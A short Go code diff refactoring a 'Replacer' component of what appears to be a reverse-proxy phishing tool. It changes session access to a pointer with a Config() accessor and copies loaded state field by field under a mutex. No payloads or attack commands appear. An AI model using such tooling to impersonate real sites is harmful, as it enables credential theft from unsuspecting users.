@@ -48,9 +48,9 @@ func (r *Replacer) GetSessionFileName() string {
 // Init initializes the Replacer struct.
 // If session.json is found, it loads the data from it.
 // Otherwise, it creates a new Replacer struct.
-func (r *Replacer) Init(s session.Session) error {
+func (r *Replacer) Init(s *session.Session) error {
 	if r.Target == "" {
-		r.Target = s.Config.Proxy.Target
+		r.Target = s.Config().Proxy.Target
 	}
 
 	err := r.Load()
@@ -60,26 +60,26 @@ func (r *Replacer) Init(s session.Session) error {
 	}
 
 	if r.Phishing == "" {
-		r.Phishing = s.Config.Proxy.Phishing
+		r.Phishing = s.Config().Proxy.Phishing
 	}
 
 	if r.Target == "" {
-		r.Target = s.Config.Proxy.Target
+		r.Target = s.Config().Proxy.Target
 	}
 
 	if r.ExternalOriginPrefix == "" {
-		r.ExternalOriginPrefix = s.Config.Origins.ExternalOriginPrefix
+		r.ExternalOriginPrefix = s.Config().Origins.ExternalOriginPrefix
 	}
 
-	r.SubdomainMap = s.Config.Origins.SubdomainMap
-	r.SetExternalOrigins(s.Config.Origins.ExternalOrigins)
-	r.SetOrigins(s.Config.Origins.OriginsMapping)
+	r.SubdomainMap = s.Config().Origins.SubdomainMap
+	r.SetExternalOrigins(s.Config().Origins.ExternalOrigins)
+	r.SetOrigins(s.Config().Origins.OriginsMapping)
 
 	if err = r.DomainMapping(); err != nil {
 		return err
 	}
 
-	r.SetCustomResponseTransformations(s.Config.Transform.Response.CustomContent)
+	r.SetCustomResponseTransformations(s.Config().Transform.Response.CustomContent)
 	r.MakeReplacements()
 
 	// Save the replacer
@@ -358,8 +358,28 @@ func (r *Replacer) Load() error {
 		return err
 	}
 
-	// update the current replacer pointer
-	*r = *rep
+	// Copy field by field instead of `*r = *rep`: Replacer embeds a
+	// sync.RWMutex, and copying the whole struct would copy the lock value,
+	// which go vet flags (and which is unsafe if r is ever shared/locked
+	// concurrently).
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.Phishing = rep.Phishing
+	r.Target = rep.Target
+	r.ExternalOrigin = rep.ExternalOrigin
+	r.ExternalOriginPrefix = rep.ExternalOriginPrefix
+	r.Origins = rep.Origins
+	r.WildcardMapping = rep.WildcardMapping
+	r.SubdomainMap = rep.SubdomainMap
+	r.CustomResponseTransformations = rep.CustomResponseTransformations
+	r.ForwardReplacements = rep.ForwardReplacements
+	r.ForwardWildcardReplacements = rep.ForwardWildcardReplacements
+	r.BackwardReplacements = rep.BackwardReplacements
+	r.BackwardWildcardReplacements = rep.BackwardWildcardReplacements
+	r.LastForwardReplacements = rep.LastForwardReplacements
+	r.LastBackwardReplacements = rep.LastBackwardReplacements
+	r.WildcardDomain = rep.WildcardDomain
 	return nil
 }
 
